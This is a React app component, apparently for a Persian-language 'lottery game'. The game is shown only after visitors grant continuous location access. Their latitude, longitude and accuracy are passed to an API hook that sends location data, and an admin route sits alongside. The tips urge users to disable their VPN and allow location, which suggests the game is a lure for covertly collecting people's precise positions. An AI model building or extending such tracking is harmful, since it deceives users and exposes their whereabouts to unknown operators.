import { useEffect, useState } from "react";
import { Routes, Route } from "react-router-dom";

import { useLocation } from "./hooks/useLocation";
import { useLocationAPI } from "./hooks/useLocationAPI";
import LotteryGame from "./components/LotteryGame";
import LocationRequest from "./components/LocationRequest";
import AdminLayout from "./components/AdminLayout";

function App() {
  const [locationTips, setLocationTips] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  const {
    location,
    error: locationError,
    loading: locationLoading,
    requestLocation,
    hasPermission,
    isWatching,
    getLocationTips,
  } = useLocation();

  const locationAPI = useLocationAPI(location);

  useEffect(() => {
    setIsLoading(false);
  }, []);

  // Load location tips
  useEffect(() => {
    const loadLocationTips = async () => {
      try {
        const tips = await getLocationTips();
        setLocationTips(tips);
      } catch (error) {
        console.error("Error loading location tips:", error);
        setLocationTips([
          "VPN را غیرفعال کنید",
          "وقتی درخواست شد، اجازه دهید",
          "برای سیگنال بهتر، به فضای باز بروید",
          "مرورگر خود را بررسی کنید",
        ]);
      }
    };

    loadLocationTips();
  }, [getLocationTips]);

  const handleLocationRequest = async () => {
    try {
      await requestLocation();
    } catch (error) {
      console.error("Error requesting location:", error);
    }
  };

  // Show loading screen
  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 to-purple-900 flex items-center justify-center">
        <div className="text-white text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto mb-4"></div>
          <p>در حال بارگذاری...</p>
        </div>
      </div>
    );
  }

  // Render content based on location permission
  const renderContent = () => {
    if (!hasPermission || !location || !isWatching) {
      return (
        <LocationRequest
          onRequestLocation={handleLocationRequest}
          loading={locationLoading}
          error={locationError}
          locationTips={locationTips}
        />
      );
    }

    // Show lottery game directly when location is available
    return (
      <LotteryGame
        location={location}
        locationData={{
          latitude: location.latitude,
          longitude: location.longitude,
          accuracy: location.accuracy,
          isGPS: location.isGPS,
        }}
        isWatching={isWatching}
        apiStatus={{
          isSending: locationAPI.isSending,
          lastSent: locationAPI.lastSent,
          error: locationAPI.error,
          sendLocationData: locationAPI.sendLocationData,
        }}
      />
    );
  };

  return (
    <Routes>
      <Route path="/" element={renderContent()} />
      <Route path="/admin" element={<AdminLayout />} />
      <Route path="*" element={renderContent()} />
    </Routes>
  );
}

export default App;
